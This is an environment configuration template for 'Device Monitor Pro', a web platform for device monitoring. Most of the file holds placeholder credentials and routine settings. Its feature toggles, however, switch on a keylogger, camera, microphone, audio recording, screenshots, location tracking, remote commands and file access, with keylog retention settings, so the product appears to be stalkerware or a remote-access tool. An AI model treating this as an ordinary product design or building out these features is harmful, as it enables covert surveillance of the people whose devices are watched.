# ============================================================================
# DEVICE MONITOR PRO - COMPLETE ENVIRONMENT CONFIGURATION
# Version: 3.0.0
# Environment: Production
# Last Updated: 2024
# ============================================================================

# ----------------------------------------------------------------------------
# APP CONFIGURATION
# ----------------------------------------------------------------------------
NEXT_PUBLIC_APP_NAME="Device Monitor Pro"
NEXT_PUBLIC_APP_VERSION="3.0.0"
NEXT_PUBLIC_APP_DESCRIPTION="Professional device monitoring and management platform with real-time surveillance capabilities"
NEXT_PUBLIC_APP_URL="https://your-domain.vercel.app"
NEXT_PUBLIC_APP_ENV="production"

# ----------------------------------------------------------------------------
# API & WEBHOOKS CONFIGURATION
# ----------------------------------------------------------------------------
NEXT_PUBLIC_API_URL="https://your-backend.vercel.app/api/v1"
NEXT_PUBLIC_WS_URL="wss://your-backend.vercel.app"
NEXT_PUBLIC_GRAPHQL_URL="https://your-backend.vercel.app/graphql"

# ----------------------------------------------------------------------------
# FEATURE FLAGS
# ----------------------------------------------------------------------------
NEXT_PUBLIC_ENABLE_ANALYTICS=true
NEXT_PUBLIC_ENABLE_SENTRY=true
NEXT_PUBLIC_ENABLE_MONITORING=true
NEXT_PUBLIC_ENABLE_PWA=true
NEXT_PUBLIC_ENABLE_OFFLINE_MODE=true
NEXT_PUBLIC_ENABLE_DEBUG_MODE=false
NEXT_PUBLIC_ENABLE_DEV_TOOLS=false
NEXT_PUBLIC_ENABLE_SERVICE_WORKER=true

# ----------------------------------------------------------------------------
# AUTHENTICATION CONFIGURATION
# ----------------------------------------------------------------------------
NEXTAUTH_SECRET="your-super-secret-nextauth-key-minimum-32-characters"
NEXTAUTH_URL="https://your-domain.vercel.app"
NEXTAUTH_URL_INTERNAL="http://localhost:3000"

JWT_SECRET="your-jwt-secret-key-minimum-32-characters-long"
JWT_REFRESH_SECRET="your-refresh-secret-key-minimum-32-characters"
JWT_ACCESS_EXPIRY="15m"
JWT_REFRESH_EXPIRY="7d"
JWT_ALGORITHM="HS256"

# ----------------------------------------------------------------------------
# DATABASE CONFIGURATION (MongoDB Atlas)
# ----------------------------------------------------------------------------
MONGODB_URI="mongodb+srv://username:password@cluster.mongodb.net/devicemonitor?retryWrites=true&w=majority&appName=Cluster"
MONGODB_DB_NAME="device_monitor_prod"
MONGODB_USER="your_db_user"
MONGODB_PASSWORD="your_db_password"
MONGODB_HOST="cluster.mongodb.net"
MONGODB_PORT="27017"
MONGODB_OPTIONS="retryWrites=true&w=majority"

# ----------------------------------------------------------------------------
# REDIS CONFIGURATION (Upstash / Redis Cloud)
# ----------------------------------------------------------------------------
REDIS_URL="redis://:password@redis-host:6379"
REDIS_HOST="your-redis-host.redis.cache.windows.net"
REDIS_PORT="6379"
REDIS_PASSWORD="your-redis-password"
REDIS_DB="0"
REDIS_TLS="true"
REDIS_KEY_PREFIX="device_monitor:"
REDIS_CACHE_TTL="3600"

# ----------------------------------------------------------------------------
# SECURITY & ENCRYPTION
# ----------------------------------------------------------------------------
AES_SECRET_KEY="your-32-character-aes-encryption-key-here"
AES_IV="your-16-character-iv"
BCRYPT_ROUNDS="12"
CSRF_SECRET="your-csrf-secret-key-minimum-32-characters"
RATE_LIMIT_WINDOW_MS="900000"
RATE_LIMIT_MAX_REQUESTS="100"
RATE_LIMIT_WINDOW_MS_LOGIN="300000"
RATE_LIMIT_MAX_REQUESTS_LOGIN="5"

# ----------------------------------------------------------------------------
# WEBHOOKS & INTEGRATIONS
# ----------------------------------------------------------------------------
# Discord
DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
DISCORD_WEBHOOK_NAME="Device Monitor"
DISCORD_WEBHOOK_AVATAR="https://your-domain.com/logo.png"

# Slack
SLACK_WEBHOOK_URL="https://hooks.slack.com/services/your-webhook-url"
SLACK_CHANNEL="#alerts"
SLACK_USERNAME="Device Monitor Bot"

# Telegram
TELEGRAM_BOT_TOKEN="your-telegram-bot-token"
TELEGRAM_CHAT_ID="your-chat-id"

# ----------------------------------------------------------------------------
# EMAIL CONFIGURATION (SMTP)
# ----------------------------------------------------------------------------
SMTP_HOST="smtp.gmail.com"
SMTP_PORT="587"
SMTP_USER="your-email@gmail.com"
SMTP_PASS="your-app-password"
SMTP_SECURE="false"
EMAIL_FROM="noreply@devicemonitor.com"
EMAIL_FROM_NAME="Device Monitor Pro"
EMAIL_REPLY_TO="support@devicemonitor.com"

# ----------------------------------------------------------------------------
# CLOUD SERVICES - AWS S3
# ----------------------------------------------------------------------------
AWS_ACCESS_KEY_ID="your-aws-access-key"
AWS_SECRET_ACCESS_KEY="your-aws-secret-key"
AWS_REGION="us-east-1"
AWS_S3_BUCKET="your-bucket-name"
AWS_S3_BUCKET_PUBLIC="your-public-bucket"
AWS_CLOUDFRONT_URL="https://your-cloudfront.net"
AWS_S3_ENDPOINT="https://s3.amazonaws.com"

# ----------------------------------------------------------------------------
# CLOUD SERVICES - Google Cloud Platform
# ----------------------------------------------------------------------------
GCP_PROJECT_ID="your-project-id"
GCP_CLIENT_EMAIL="your-service-account@project.iam.gserviceaccount.com"
GCP_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\nYour Private Key Here\n-----END PRIVATE KEY-----\n"
GCP_STORAGE_BUCKET="your-bucket-name"

# ----------------------------------------------------------------------------
# MAPS & GEOLOCATION
# ----------------------------------------------------------------------------
NEXT_PUBLIC_MAPBOX_TOKEN="pk.your-mapbox-token"
GOOGLE_MAPS_API_KEY="your-google-maps-api-key"
OPENCAGE_API_KEY="your-opencage-api-key"
MAP_TILE_PROVIDER="mapbox"

# ----------------------------------------------------------------------------
# ANALYTICS & MONITORING
# ----------------------------------------------------------------------------
# Google Analytics
NEXT_PUBLIC_GA_ID="G-XXXXXXXXXX"
GA_TRACKING_ID="UA-XXXXXXXXX-X"
GA_API_SECRET="your-ga-api-secret"

# Sentry Error Tracking
NEXT_PUBLIC_SENTRY_DSN="https://your-sentry-dsn@sentry.io/project-id"
SENTRY_AUTH_TOKEN="your-sentry-auth-token"
SENTRY_ORG="your-org"
SENTRY_PROJECT="your-project"
SENTRY_ENVIRONMENT="production"

# Logging
LOG_LEVEL="info"
LOG_DIR="logs"
LOG_RETENTION_DAYS="30"
LOG_FORMAT="json"
LOG_ALERT_ON_ERROR="true"

# ----------------------------------------------------------------------------
# FIREBASE CONFIGURATION (FCM for Push Notifications)
# ----------------------------------------------------------------------------
FIREBASE_PROJECT_ID="your-project-id"
FIREBASE_PRIVATE_KEY_ID="your-private-key-id"
FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\nYour Private Key\n-----END PRIVATE KEY-----\n"
FIREBASE_CLIENT_EMAIL="firebase-adminsdk@project.iam.gserviceaccount.com"
FIREBASE_CLIENT_ID="your-client-id"
FIREBASE_CLIENT_CERT_URL="https://www.googleapis.com/robot/v1/metadata/x509/your-service-account"
FIREBASE_AUTH_URI="https://accounts.google.com/o/oauth2/auth"
FIREBASE_TOKEN_URI="https://oauth2.googleapis.com/token"
FIREBASE_AUTH_PROVIDER_X509_CERT_URL="https://www.googleapis.com/oauth2/v1/certs"
FIREBASE_DATABASE_URL="https://your-project.firebaseio.com"
FIREBASE_STORAGE_BUCKET="your-project.appspot.com"

# ----------------------------------------------------------------------------
# TWILIO CONFIGURATION (SMS & Calls)
# ----------------------------------------------------------------------------
TWILIO_ACCOUNT_SID="ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
TWILIO_AUTH_TOKEN="your-twilio-auth-token"
TWILIO_PHONE_NUMBER="+1234567890"
TWILIO_MESSAGING_SERVICE_SID="MGxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
TWILIO_VERIFY_SERVICE_SID="VAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

# ----------------------------------------------------------------------------
# DEVICE MONITORING CONFIGURATION
# ----------------------------------------------------------------------------
# Heartbeat & Timeouts
DEVICE_HEARTBEAT_INTERVAL="30000"
DEVICE_TIMEOUT_MS="120000"
DEVICE_OFFLINE_THRESHOLD="180000"
DEVICE_CHECK_INTERVAL="30000"
DEVICE_MAX_RETRIES="3"
DEVICE_RETRY_DELAY="5000"

# Alerts
ALERT_CHECK_INTERVAL="60000"
ALERT_CPU_THRESHOLD="80"
ALERT_MEMORY_THRESHOLD="85"
ALERT_BATTERY_THRESHOLD="20"
ALERT_SIGNAL_THRESHOLD="30"
ALERT_DISK_THRESHOLD="90"
ALERT_PROCESS_THRESHOLD="100"

# Data Retention
DATA_RETENTION_DAYS="30"
KEYLOG_RETENTION_DAYS="30"
LOCATION_HISTORY_DAYS="7"
COMMAND_HISTORY_DAYS="90"
AUDIT_LOG_RETENTION_DAYS="365"

# ----------------------------------------------------------------------------
# FILE UPLOAD CONFIGURATION
# ----------------------------------------------------------------------------
MAX_FILE_SIZE="52428800"
MAX_FILE_SIZE_MB="50"
ALLOWED_FILE_TYPES="image/jpeg,image/png,image/jpg,video/mp4,audio/mpeg,application/pdf,text/plain"
UPLOAD_DIR="uploads"
TEMP_DIR="temp"
UPLOAD_MAX_FILES="10"
UPLOAD_CHUNK_SIZE="1048576"

# ----------------------------------------------------------------------------
# PWA CONFIGURATION
# ----------------------------------------------------------------------------
NEXT_PUBLIC_PWA_ENABLED="true"
PWA_OFFLINE_FALLBACK="true"
PWA_CACHE_VERSION="1"
PWA_PRECACHE_ROUTES="/dashboard,/devices,/settings"
PWA_STRATEGY="cache-first"
PWA_OFFLINE_PAGE="/offline"

# ----------------------------------------------------------------------------
# CORS CONFIGURATION
# ----------------------------------------------------------------------------
CORS_ORIGIN="https://your-domain.vercel.app,http://localhost:3000,http://localhost:3001"
CORS_METHODS="GET,POST,PUT,DELETE,OPTIONS"
CORS_ALLOWED_HEADERS="Content-Type,Authorization,X-API-Key,X-Requested-With"
CORS_CREDENTIALS="true"
CORS_MAX_AGE="86400"

# ----------------------------------------------------------------------------
# RATE LIMITING
# ----------------------------------------------------------------------------
RATE_LIMIT_ENABLED="true"
RATE_LIMIT_STORE="redis"
RATE_LIMIT_SKIP_SUCCESSFUL="false"

# ----------------------------------------------------------------------------
# CACHE CONFIGURATION
# ----------------------------------------------------------------------------
CACHE_TTL="3600"
CACHE_MAX_ITEMS="10000"
CACHE_PREFIX="device_monitor"
CACHE_STALE_WHILE_REVALIDATE="86400"

# ----------------------------------------------------------------------------
# API CONFIGURATION
# ----------------------------------------------------------------------------
API_VERSION="v1"
API_PREFIX="/api"
API_TIMEOUT="30000"
API_RETRY_ATTEMPTS="3"
API_RETRY_DELAY="1000"
API_RATE_LIMIT="100"
API_RATE_LIMIT_WINDOW="15"

# ----------------------------------------------------------------------------
# SSL/TLS CONFIGURATION
# ----------------------------------------------------------------------------
SSL_ENABLED="true"
SSL_CERT_PATH="/etc/ssl/certs"
SSL_KEY_PATH="/etc/ssl/private"
SSL_CA_PATH="/etc/ssl/certs"

# ----------------------------------------------------------------------------
# INTERNATIONALIZATION (i18n)
# ----------------------------------------------------------------------------
DEFAULT_LOCALE="en"
SUPPORTED_LOCALES="en,id,zh,es,ar,hi,ru,pt"
NEXT_PUBLIC_DEFAULT_LOCALE="en"
LOCALE_COOKIE="NEXT_LOCALE"

# ----------------------------------------------------------------------------
# FEATURE TOGGLES (Production Features)
# ----------------------------------------------------------------------------
FEATURE_SURVEILLANCE_ENABLED="true"
FEATURE_REMOTE_COMMANDS_ENABLED="true"
FEATURE_FILE_MANAGER_ENABLED="true"
FEATURE_KEYLOGGER_ENABLED="true"
FEATURE_CAMERA_ENABLED="true"
FEATURE_MICROPHONE_ENABLED="true"
FEATURE_LOCATION_TRACKING_ENABLED="true"
FEATURE_SCREENSHOT_CAPTURE="true"
FEATURE_AUDIO_RECORDING="true"

# ----------------------------------------------------------------------------
# THIRD-PARTY SERVICES
# ----------------------------------------------------------------------------
# Stripe (if using payments)
STRIPE_PUBLIC_KEY="pk_live_xxxxxxxxxxxxxxxx"
STRIPE_SECRET_KEY="sk_live_xxxxxxxxxxxxxxxx"
STRIPE_WEBHOOK_SECRET="whsec_xxxxxxxxxxxxxxxx"
STRIPE_PRICE_ID="price_xxxxxxxxxxxxxxxx"

# SendGrid
SENDGRID_API_KEY="SG.xxxxxxxxxxxxxxxx"
SENDGRID_FROM_EMAIL="noreply@devicemonitor.com"
SENDGRID_FROM_NAME="Device Monitor Pro"

# Cloudflare
CLOUDFLARE_ZONE_ID="your-zone-id"
CLOUDFLARE_API_TOKEN="your-api-token"
CLOUDFLARE_ACCOUNT_ID="your-account-id"

# ----------------------------------------------------------------------------
# DEVELOPMENT & DEBUG (Production should be false)
# ----------------------------------------------------------------------------
NODE_ENV="production"
VERCEL_ENV="production"
DEBUG="false"
VERBOSE_LOGGING="false"
NEXT_PUBLIC_DEBUG="false"
NEXT_PUBLIC_SHOW_DEV_BANNER="false"

# ----------------------------------------------------------------------------
# ADMIN CONFIGURATION
# ----------------------------------------------------------------------------
ADMIN_EMAIL="admin@devicemonitor.com"
ADMIN_NAME="System Administrator"
ADMIN_PASSWORD="Admin123!@#ChangeMeNow!"
ADMIN_PHONE="+1234567890"
ADMIN_ROLE="super_admin"

# ----------------------------------------------------------------------------
# MAINTENANCE MODE
# ----------------------------------------------------------------------------
MAINTENANCE_MODE="false"
MAINTENANCE_MESSAGE="We are currently performing scheduled maintenance. Please check back in a few minutes."
MAINTENANCE_ALLOWED_IPS=""

# ----------------------------------------------------------------------------
# BACKUP CONFIGURATION
# ----------------------------------------------------------------------------
BACKUP_ENABLED="true"
BACKUP_SCHEDULE="0 2 * * *"
BACKUP_RETENTION_DAYS="30"
BACKUP_STORAGE="s3"
BACKUP_COMPRESS="true"
BACKUP_ENCRYPT="true"

# ----------------------------------------------------------------------------
# MONITORING & ALERTING
# ----------------------------------------------------------------------------
MONITORING_ENABLED="true"
MONITORING_HEALTH_CHECK_ENDPOINT="/health"
MONITORING_METRICS_ENDPOINT="/metrics"
MONITORING_ALERT_WEBHOOK="https://hooks.slack.com/services/xxx"

# ----------------------------------------------------------------------------
# SESSION MANAGEMENT
# ----------------------------------------------------------------------------
SESSION_MAX_AGE="604800"  # 7 days
SESSION_ROLLING="true"
SESSION_SAME_SITE="lax"
SESSION_SECURE="true"
SESSION_HTTP_ONLY="true"

# ----------------------------------------------------------------------------
# PERFORMANCE OPTIMIZATION
# ----------------------------------------------------------------------------
NEXT_PUBLIC_PERFORMANCE_MODE="balanced"
ENABLE_COMPRESSION="true"
ENABLE_CACHING="true"
CDN_ENABLED="true"

# ----------------------------------------------------------------------------
# END OF CONFIGURATION
# ----------------------------------------------------------------------------
